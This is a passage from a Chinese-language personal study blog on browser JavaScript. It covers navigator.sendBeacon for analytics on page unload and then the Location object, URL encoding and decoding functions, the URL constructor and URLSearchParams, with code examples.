<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;a id=&quot;target&quot; href=&quot;https://baidu.com&quot;&gt;click&lt;/a&gt;</span></span><br><span class="line"><span class="keyword">const</span> clickTime = <span class="number">350</span>;</span><br><span class="line"><span class="keyword">const</span> theLink = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;target&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">log</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">  xhr.open(<span class="string">&#x27;post&#x27;</span>, <span class="string">&#x27;/log&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line">  xhr.setRequestHeader(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>);</span><br><span class="line">  xhr.send(<span class="string">&#x27;foo=bar&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">theLink.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  event.preventDefault();</span><br><span class="line">  log();</span><br><span class="line"></span><br><span class="line">  <span class="built_in">setTimeout</span>(<span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">window</span>.location.href = theLink.getAttribute(<span class="string">&#x27;href&#x27;</span>);</span><br><span class="line">  &#125;, clickTime);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码使用<code>setTimeout</code>，拖延了350毫秒，才让页面跳转，因此使得异步 AJAX 有时间发出。</p>
<p>这些做法的共同问题是，卸载的时间被硬生生拖长了，后面页面的加载被推迟了，用户体验不好。</p>
<p>为了解决这个问题，浏览器引入了<code>Navigator.sendBeacon()</code>方法。这个方法还是异步发出请求，但是请求与当前页面线程脱钩，作为浏览器进程的任务，因此可以保证会把数据发出去，不拖延卸载流程。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.addEventListener(<span class="string">&#x27;unload&#x27;</span>, logData, <span class="literal">false</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">logData</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  navigator.sendBeacon(<span class="string">&#x27;/log&#x27;</span>, analyticsData);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>Navigator.sendBeacon</code>方法接受两个参数，第一个参数是目标服务器的 URL，第二个参数是所要发送的数据（可选），可以是任意类型（字符串、表单对象、二进制对象等等）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">navigator.sendBeacon(url, data)</span><br></pre></td></tr></table></figure>
<p>这个方法的返回值是一个布尔值，成功发送数据为<code>true</code>，否则为<code>false</code>。</p>
<p>该方法发送数据的 HTTP 方法是 POST，可以跨域，类似于表单提交数据。它不能指定回调函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;body onload=&quot;analytics(&#x27;start&#x27;)&quot; onunload=&quot;analytics(&#x27;end&#x27;)&quot;&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">analytics</span>(<span class="params">state</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!navigator.sendBeacon) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> URL = <span class="string">&#x27;http://example.com/analytics&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> data = <span class="string">&#x27;state=&#x27;</span> + state + <span class="string">&#x27;&amp;location=&#x27;</span> + <span class="built_in">window</span>.location;</span><br><span class="line">  navigator.sendBeacon(URL, data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-XMLHttpRequest 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0064</title>
    <url>/2021/06/02/%E6%89%93%E5%8D%A10064/</url>
    <content><![CDATA[<p><font color=#84bf96>It’s raining all the time, but we won’t stop.</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="10-Location对象，URL对象，URLSearchParams对象"><a href="#10-Location对象，URL对象，URLSearchParams对象" class="headerlink" title="10. Location对象，URL对象，URLSearchParams对象"></a>10. Location对象，URL对象，URLSearchParams对象</h3><p>URL 是互联网的基础设施之一。浏览器提供了一些原生对象，用来管理 URL。</p>
<h4 id="10-1-Location-对象"><a href="#10-1-Location-对象" class="headerlink" title="10.1 Location 对象"></a>10.1 Location 对象</h4><p><code>Location</code>对象是浏览器提供的原生对象，提供 URL 相关的信息和操作方法。通过<code>window.location</code>和<code>document.location</code>属性，可以拿到这个对象。</p>
<h5 id="10-1-1-属性"><a href="#10-1-1-属性" class="headerlink" title="10.1.1 属性"></a>10.1.1 属性</h5><p><code>Location</code>对象提供以下属性。</p>
<p><code>Location.href</code>:整个 URL。<br><code>Location.protocol</code>:当前 URL 的协议，包括冒号（<code>:</code>）。<br><code>Location.host</code>:主机。如果端口不是协议默认的<code>80</code>和<code>433</code>，则还会包括冒号（<code>:</code>）和端口。<br><code>Location.hostname</code>:主机名，不包括端口。<br><code>Location.port</code>:端口号。<br><code>Location.pathname</code>:URL 的路径部分，从根路径/开始。<br><code>Location.search</code>:查询字符串部分，从问号<code>?</code>开始。<br><code>Location.hash</code>:片段字符串部分，从<code>#</code>开始。<br><code>Location.username</code>:域名前面的用户名。<br><code>Location.password</code>:域名前面的密码。<br><code>Location.origin</code>:URL 的协议、主机名和端口。</p>
<span id="more"></span>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 当前网址为</span></span><br><span class="line"><span class="comment">// http://user:passwd@www.example.com:4097/path/a.html?x=111#part1</span></span><br><span class="line"><span class="built_in">document</span>.location.href</span><br><span class="line"><span class="comment">// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.protocol</span><br><span class="line"><span class="comment">// &quot;http:&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.host</span><br><span class="line"><span class="comment">// &quot;www.example.com:4097&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.hostname</span><br><span class="line"><span class="comment">// &quot;www.example.com&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.port</span><br><span class="line"><span class="comment">// &quot;4097&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.pathname</span><br><span class="line"><span class="comment">// &quot;/path/a.html&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.search</span><br><span class="line"><span class="comment">// &quot;?x=111&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.hash</span><br><span class="line"><span class="comment">// &quot;#part1&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.username</span><br><span class="line"><span class="comment">// &quot;user&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.password</span><br><span class="line"><span class="comment">// &quot;passwd&quot;</span></span><br><span class="line"><span class="built_in">document</span>.location.origin</span><br><span class="line"><span class="comment">// &quot;http://user:passwd@www.example.com:4097&quot;</span></span><br></pre></td></tr></table></figure>
<p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写。</p>
<p>注意，如果对<code>Location.href</code>写入新的 URL 地址，浏览器会立刻跳转到这个新地址。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳转到新网址</span></span><br><span class="line"><span class="built_in">document</span>.location.href = <span class="string">&#x27;http://www.example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>这个特性常常用于让网页自动滚动到新的锚点。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.location.href = <span class="string">&#x27;#top&#x27;</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">document</span>.location.hash = <span class="string">&#x27;#top&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>直接改写<code>location</code>，相当于写入<code>href</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">document</span>.location = <span class="string">&#x27;http://www.example.com&#x27;</span>;</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="built_in">document</span>.location.href = <span class="string">&#x27;http://www.example.com&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>另外，<code>Location.href</code>属性是浏览器唯一允许跨域写入的属性，即非同源的窗口可以改写另一个窗口（比如子窗口与父窗口）的<code>Location.href</code>属性，导致后者的网址跳转。<code>Location</code>的其他属性都不允许跨域写入。</p>
<h5 id="10-1-2-方法"><a href="#10-1-2-方法" class="headerlink" title="10.1.2 方法"></a>10.1.2 方法</h5><h6 id="（1）Location-assign"><a href="#（1）Location-assign" class="headerlink" title="（1）Location.assign()"></a>（1）Location.assign()</h6><p><code>assign</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳转到新的网址</span></span><br><span class="line"><span class="built_in">document</span>.location.assign(<span class="string">&#x27;http://www.example.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h6 id="（2）Location-replace"><a href="#（2）Location-replace" class="headerlink" title="（2）Location.replace()"></a>（2）Location.replace()</h6><p><code>replace</code>方法接受一个 URL 字符串作为参数，使得浏览器立刻跳转到新的 URL。如果参数不是有效的 URL 字符串，则会报错。</p>
<p>它与<code>assign</code>方法的差异在于，<code>replace</code>会在浏览器的浏览历史<code>History</code>里面删除当前网址，也就是说，一旦使用了该方法，后退按钮就无法回到当前网页了，相当于在浏览历史里面，使用新的 URL 替换了老的 URL。它的一个应用是，当脚本发现当前是移动设备时，就立刻跳转到移动版网页。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 跳转到新的网址</span></span><br><span class="line"><span class="built_in">document</span>.location.replace(<span class="string">&#x27;http://www.example.com&#x27;</span>)</span><br></pre></td></tr></table></figure>
<h6 id="（3）Location-reload"><a href="#（3）Location-reload" class="headerlink" title="（3）Location.reload()"></a>（3）Location.reload()</h6><p><code>reload</code>方法使得浏览器重新加载当前网址，相当于按下浏览器的刷新按钮。</p>
<p>它接受一个布尔值作为参数。如果参数为<code>true</code>，浏览器将向服务器重新请求这个网页，并且重新加载后，网页将滚动到头部（即<code>scrollTop === 0</code>）。如果参数是<code>false</code>或为空，浏览器将从本地缓存重新加载该网页，并且重新加载后，网页的视口位置是重新加载前的位置。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 向服务器重新请求当前网址</span></span><br><span class="line"><span class="built_in">window</span>.location.reload(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure>
<h6 id="（4）Location-toString"><a href="#（4）Location-toString" class="headerlink" title="（4）Location.toString()"></a>（4）Location.toString()</h6><p><code>toString</code>方法返回整个 URL 字符串，相当于读取<code>Location.href</code>属性。</p>
<h4 id="10-2-URL-的编码和解码"><a href="#10-2-URL-的编码和解码" class="headerlink" title="10.2 URL 的编码和解码"></a>10.2 URL 的编码和解码</h4><p>网页的 URL 只能包含合法的字符。合法字符分成两类。</p>
<ul>
<li>URL 元字符：分号（<code>;</code>），逗号（<code>,</code>），斜杠（<code>/</code>），问号（<code>?</code>），冒号（<code>:</code>），at（<code>@</code>），<code>&amp;</code>，等号（<code>=</code>），加号（<code>+</code>），美元符号（<code>$</code>），井号（<code>#</code>）</li>
<li>语义字符：<code>a-z</code>，<code>A-Z</code>，<code>0-9</code>，连词号（<code>-</code>），下划线（<code>_</code>），点（<code>.</code>），感叹号（<code>!</code>），波浪线（<code>~</code>），星号（<code>*</code>），单引号（<code>&#39;</code>），圆括号（<code>()</code>）</li>
</ul>
<p>除了以上字符，其他字符出现在 URL 之中都必须转义，规则是根据操作系统的默认编码，将每个字节转为百分号（<code>%</code>）加上两个大写的十六进制字母。</p>
<p>比如，UTF-8 的操作系统上，<code>http://www.example.com/q=春节</code>这个 URL 之中，汉字“春节”不是 URL 的合法字符，所以被浏览器自动转成<code>http://www.example.com/q=%E6%98%A5%E8%8A%82</code> 。其中，“春”转成了<code>%E6%98%A5</code>，“节”转成了<code>%E8%8A%82</code> 。这是因为“春”和“节”的 UTF-8 编码分别是<code>E6 98 A5</code>和<code>E8 8A 82</code>，将每个字节前面加上百分号，就构成了 URL 编码。</p>
<p>JavaScript 提供四个 URL 的编码/解码方法。</p>
<ul>
<li><code>encodeURI()</code></li>
<li><code>encodeURIComponent()</code></li>
<li><code>decodeURI()</code></li>
<li><code>decodeURIComponent()</code></li>
</ul>
<h5 id="10-2-1-encodeURI"><a href="#10-2-1-encodeURI" class="headerlink" title="10.2.1 encodeURI()"></a>10.2.1 encodeURI()</h5><p><code>encodeURI()</code>方法用于转码整个 URL。它的参数是一个字符串，代表整个 URL。它会将元字符和语义字符之外的字符，都进行转义。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">encodeURI</span>(<span class="string">&#x27;http://www.example.com/q=春节&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;http://www.example.com/q=%E6%98%A5%E8%8A%82&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="10-2-2-encodeURIComponent"><a href="#10-2-2-encodeURIComponent" class="headerlink" title="10.2.2 encodeURIComponent()"></a>10.2.2 encodeURIComponent()</h5><p><code>encodeURIComponent()</code>方法用于转码 URL 的组成部分，会转码除了语义字符之外的所有字符，即元字符也会被转码。所以，它不能用于转码整个 URL。它接受一个参数，就是 URL 的片段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;春节&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;%E6%98%A5%E8%8A%82&quot;</span></span><br><span class="line"><span class="built_in">encodeURIComponent</span>(<span class="string">&#x27;http://www.example.com/q=春节&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;http%3A%2F%2Fwww.example.com%2Fq%3D%E6%98%A5%E8%8A%82&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>encodeURIComponent()</code>会连 URL 元字符一起转义，所以如果转码整个 URL 就会出错。</p>
<h5 id="10-2-3-decodeURI"><a href="#10-2-3-decodeURI" class="headerlink" title="10.2.3 decodeURI()"></a>10.2.3 decodeURI()</h5><p><code>decodeURI()</code>方法用于整个 URL 的解码。它是<code>encodeURI()</code>方法的逆运算。它接受一个参数，就是转码后的 URL。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">decodeURI</span>(<span class="string">&#x27;http://www.example.com/q=%E6%98%A5%E8%8A%82&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;http://www.example.com/q=春节&quot;</span></span><br></pre></td></tr></table></figure>
<h5 id="10-2-4-decodeURIComponent"><a href="#10-2-4-decodeURIComponent" class="headerlink" title="10.2.4 decodeURIComponent()"></a>10.2.4 decodeURIComponent()</h5><p><code>decodeURIComponent()</code>用于URL 片段的解码。它是<code>encodeURIComponent()</code>方法的逆运算。它接受一个参数，就是转码后的 URL 片段。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">decodeURIComponent</span>(<span class="string">&#x27;%E6%98%A5%E8%8A%82&#x27;</span>)</span><br><span class="line"><span class="comment">// &quot;春节&quot;</span></span><br></pre></td></tr></table></figure>
<h4 id="10-3-URL-接口"><a href="#10-3-URL-接口" class="headerlink" title="10.3 URL 接口"></a>10.3 URL 接口</h4><p>浏览器原生提供<code>URL()</code>接口，它是一个构造函数，用来构造、解析和编码 URL。一般情况下，通过<code>window.URL</code>可以拿到这个构造函数。</p>
<h5 id="10-3-1-构造函数"><a href="#10-3-1-构造函数" class="headerlink" title="10.3.1 构造函数"></a>10.3.1 构造函数</h5><p><code>URL()</code>作为构造函数，可以生成 URL 实例。它接受一个表示 URL 的字符串作为参数。如果参数不是合法的 URL，会报错。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> URL(<span class="string">&#x27;http://www.example.com/index.html&#x27;</span>);</span><br><span class="line">url.href</span><br><span class="line"><span class="comment">// &quot;http://www.example.com/index.html&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面示例生成了一个 URL 实例，用来代表指定的网址。</p>
<p>除了字符串，<code>URL()</code>的参数也可以是另一个 URL 实例。这时，<code>URL()</code>会自动读取该实例的<code>href</code>属性，作为实际参数。</p>
<p>如果 URL 字符串是一个相对路径，那么需要表示绝对路径的第二个参数，作为计算基准。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url1 = <span class="keyword">new</span> URL(<span class="string">&#x27;index.html&#x27;</span>, <span class="string">&#x27;http://example.com&#x27;</span>);</span><br><span class="line">url1.href</span><br><span class="line"><span class="comment">// &quot;http://example.com/index.html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url2 = <span class="keyword">new</span> URL(<span class="string">&#x27;page2.html&#x27;</span>, <span class="string">&#x27;http://example.com/page1.html&#x27;</span>);</span><br><span class="line">url2.href</span><br><span class="line"><span class="comment">// &quot;http://example.com/page2.html&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> url3 = <span class="keyword">new</span> URL(<span class="string">&#x27;..&#x27;</span>, <span class="string">&#x27;http://example.com/a/b.html&#x27;</span>)</span><br><span class="line">url3.href</span><br><span class="line"><span class="comment">// &quot;http://example.com/&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，返回的 URL 实例的路径都是在第二个参数的基础上，切换到第一个参数得到的。最后一个例子里面，第一个参数是..，表示上层路径。</p>
<h5 id="10-3-2-实例属性"><a href="#10-3-2-实例属性" class="headerlink" title="10.3.2 实例属性"></a>10.3.2 实例属性</h5><p>URL 实例的属性与<code>Location</code>对象的属性基本一致，返回当前 URL 的信息。</p>
<p><code>URL.href</code>：返回整个 URL<br><code>URL.protocol</code>：返回协议，以冒号<code>:</code>结尾<br><code>URL.hostname</code>：返回域名<br><code>URL.host</code>：返回域名与端口，包含<code>:</code>号，默认的80和443端口会省略<br><code>URL.port</code>：返回端口<br><code>URL.origin</code>：返回协议、域名和端口<br><code>URL.pathname</code>：返回路径，以斜杠<code>/</code>开头<br><code>URL.search</code>：返回查询字符串，以问号<code>?</code>开头<br><code>URL.searchParams</code>：返回一个<code>URLSearchParams</code>实例，该属性是<code>Location</code>对象没有的<br><code>URL.hash</code>：返回片段识别符，以井号<code>#</code>开头<br><code>URL.password</code>：返回域名前面的密码<br><code>URL.username</code>：返回域名前面的用户名</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> URL(<span class="string">&#x27;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">url.href</span><br><span class="line"><span class="comment">// &quot;http://user:passwd@www.example.com:4097/path/a.html?x=111#part1&quot;</span></span><br><span class="line">url.protocol</span><br><span class="line"><span class="comment">// &quot;http:&quot;</span></span><br><span class="line">url.hostname</span><br><span class="line"><span class="comment">// &quot;www.example.com&quot;</span></span><br><span class="line">url.host</span><br><span class="line"><span class="comment">// &quot;www.example.com:4097&quot;</span></span><br><span class="line">url.port</span><br><span class="line"><span class="comment">// &quot;4097&quot;</span></span><br><span class="line">url.origin</span><br><span class="line"><span class="comment">// &quot;http://www.example.com:4097&quot;</span></span><br><span class="line">url.pathname</span><br><span class="line"><span class="comment">// &quot;/path/a.html&quot;</span></span><br><span class="line">url.search</span><br><span class="line"><span class="comment">// &quot;?x=111&quot;</span></span><br><span class="line">url.searchParams</span><br><span class="line"><span class="comment">// URLSearchParams &#123;&#125;</span></span><br><span class="line">url.hash</span><br><span class="line"><span class="comment">// &quot;#part1&quot;</span></span><br><span class="line">url.password</span><br><span class="line"><span class="comment">// &quot;passwd&quot;</span></span><br><span class="line">url.username</span><br><span class="line"><span class="comment">// &quot;user&quot;</span></span><br></pre></td></tr></table></figure>
<p>这些属性里面，只有<code>origin</code>属性是只读的，其他属性都可写，并且会立即生效。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> URL(<span class="string">&#x27;http://example.com/index.html#part1&#x27;</span>);</span><br><span class="line"></span><br><span class="line">url.pathname = <span class="string">&#x27;index2.html&#x27;</span>;</span><br><span class="line">url.href <span class="comment">// &quot;http://example.com/index2.html#part1&quot;</span></span><br><span class="line"></span><br><span class="line">url.hash = <span class="string">&#x27;#part2&#x27;</span>;</span><br><span class="line">url.href <span class="comment">// &quot;http://example.com/index2.html#part2&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，改变 URL 实例的<code>pathname</code>属性和<code>hash</code>属性，都会实时反映在 URL 实例当中。</p>
<h5 id="10-3-3-静态方法"><a href="#10-3-3-静态方法" class="headerlink" title="10.3.3 静态方法"></a>10.3.3 静态方法</h5><h6 id="（1）URL-createObjectURL"><a href="#（1）URL-createObjectURL" class="headerlink" title="（1）URL.createObjectURL()"></a>（1）URL.createObjectURL()</h6><p><code>URL.createObjectURL()</code>方法用来为上传/下载的文件、流媒体文件生成一个 URL 字符串。这个字符串代表了<code>File</code>对象或<code>Blob</code>对象的 URL。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码如下</span></span><br><span class="line"><span class="comment">// &lt;div id=&quot;display&quot;/&gt;</span></span><br><span class="line"><span class="comment">// &lt;input</span></span><br><span class="line"><span class="comment">//   type=&quot;file&quot;</span></span><br><span class="line"><span class="comment">//   id=&quot;fileElem&quot;</span></span><br><span class="line"><span class="comment">//   multiple</span></span><br><span class="line"><span class="comment">//   accept=&quot;image/*&quot;</span></span><br><span class="line"><span class="comment">//   onchange=&quot;handleFiles(this.files)&quot;</span></span><br><span class="line"><span class="comment">//  &gt;</span></span><br><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;display&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFiles</span>(<span class="params">files</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.src = <span class="built_in">window</span>.URL.createObjectURL(files[i]);</span><br><span class="line">    div.appendChild(img);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>URL.createObjectURL()</code>方法用来为上传的文件生成一个 URL 字符串，作为<code>&lt;img&gt;</code>元素的图片来源。</p>
<p>该方法生成的 URL 就像下面的样子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">blob:http:<span class="comment">//localhost/c745ef73-ece9-46da-8f66-ebes574789b1</span></span><br></pre></td></tr></table></figure>
<p>注意，每次使用<code>URL.createObjectURL()</code>方法，都会在内存里面生成一个 URL 实例。如果不再需要该方法生成的 URL 字符串，为了节省内存，可以使用<code>URL.revokeObjectURL()</code>方法释放这个实例。</p>
<h6 id="（2）URL-revokeObjectURL"><a href="#（2）URL-revokeObjectURL" class="headerlink" title="（2）URL.revokeObjectURL()"></a>（2）URL.revokeObjectURL()</h6><p><code>URL.revokeObjectURL()</code>方法用来释放<code>URL.createObjectURL()</code>方法生成的 URL 实例。它的参数就是<code>URL.createObjectURL()</code>方法返回的 URL 字符串。</p>
<p>下面为上一段的示例加上<code>URL.revokeObjectURL()</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;display&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">handleFiles</span>(<span class="params">files</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; files.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&#x27;img&#x27;</span>);</span><br><span class="line">    img.src = <span class="built_in">window</span>.URL.createObjectURL(files[i]);</span><br><span class="line">    div.appendChild(img);</span><br><span class="line">    img.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">      <span class="built_in">window</span>.URL.revokeObjectURL(<span class="built_in">this</span>.src);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，一旦图片加载成功以后，为本地文件生成的 URL 字符串就没用了，于是可以在<code>img.onload</code>回调函数里面，通过<code>URL.revokeObjectURL()</code>方法卸载这个 URL 实例。</p>
<h4 id="10-4-URLSearchParams-对象"><a href="#10-4-URLSearchParams-对象" class="headerlink" title="10.4 URLSearchParams 对象"></a>10.4 URLSearchParams 对象</h4><h5 id="10-4-1-概述"><a href="#10-4-1-概述" class="headerlink" title="10.4.1 概述"></a>10.4.1 概述</h5><p><code>URLSearchParams</code>对象是浏览器的原生对象，用来构造、解析和处理 URL 的查询字符串（即 URL 问号后面的部分）。</p>
<p>它本身也是一个构造函数，可以生成实例。参数可以为查询字符串，起首的问号<code>?</code>有没有都行，也可以是对应查询字符串的数组或对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 方法一：传入字符串</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="string">&#x27;?foo=1&amp;bar=2&#x27;</span>);</span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(<span class="built_in">document</span>.location.search);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法二：传入数组</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams([[<span class="string">&#x27;foo&#x27;</span>, <span class="number">1</span>], [<span class="string">&#x27;bar&#x27;</span>, <span class="number">2</span>]]);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 方法三：传入对象</span></span><br><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span> : <span class="number">1</span> , <span class="string">&#x27;bar&#x27;</span> : <span class="number">2</span>&#125;);</span><br></pre></td></tr></table></figure>
<p><code>URLSearchParams</code>会对查询字符串自动编码。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="string">&#x27;foo&#x27;</span>: <span class="string">&#x27;你好&#x27;</span>&#125;);</span><br><span class="line">params.toString() <span class="comment">// &quot;foo=%E4%BD%A0%E5%A5%BD&quot;</span></span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>foo</code>的值是汉字，<code>URLSearchParams</code>对其自动进行 URL 编码。</p>
<p>浏览器向服务器发送表单数据时，可以直接使用<code>URLSearchParams</code>实例作为表单数据。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> params = <span class="keyword">new</span> URLSearchParams(&#123;<span class="attr">foo</span>: <span class="number">1</span>, <span class="attr">bar</span>: <span class="number">2</span>&#125;);</span><br><span class="line">fetch(<span class="string">&#x27;https://example.com/api&#x27;</span>, &#123;</span><br><span class="line">  method: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  body: params</span><br><span class="line">&#125;).then(...)</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>fetch</code>命令向服务器发送命令时，可以直接使用<code>URLSearchParams</code>实例。</p>
<p><code>URLSearchParams</code>可以与<code>URL()</code>接口结合使用。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> url = <span class="keyword">new</span> URL(<span class="built_in">window</span>.location);</span><br><span class="line"><span class="keyword">var</span> foo = url.searchParams.get(<span class="string">&#x27;foo&#x27;</span>) || <span class="string">&#x27;somedefault&#x27;</span>;</span><br></pre></td></tr></table></figure>
<p>上面代码中，URL 实例的<code>searchParams</code>属性就是一个<code>URLSearchParams</code>实例，所以可以使用<code>URLSearchParams</code>接口的<code>get</code>方法。</p>
<p><code>URLSearchParams</code>实例有遍历器接口，可以用<code>for...of</code>循环遍历（详见《ES6 标准入门》的《Iterator》一章）。</p>
